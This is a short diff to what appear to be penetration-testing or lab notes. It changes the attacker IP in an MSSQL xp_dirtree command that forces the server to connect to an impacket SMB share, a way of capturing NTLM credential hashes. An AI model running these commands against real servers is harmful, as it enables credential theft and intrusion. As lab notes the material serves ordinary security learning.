@@ -175,7 +175,7 @@ sudo tcpdump -i tun0
 
 impacket-smbserver as . -smb2support
 
-SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.4\evil
+SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.12\evil
 or EXEC MASTER.sys.xp_dirtree '\\10.10.14.14\test', 1, 1 using a UNC (Universal Naming Convention) path
 subdirectory   depth   file   
 ------------   -----   ----
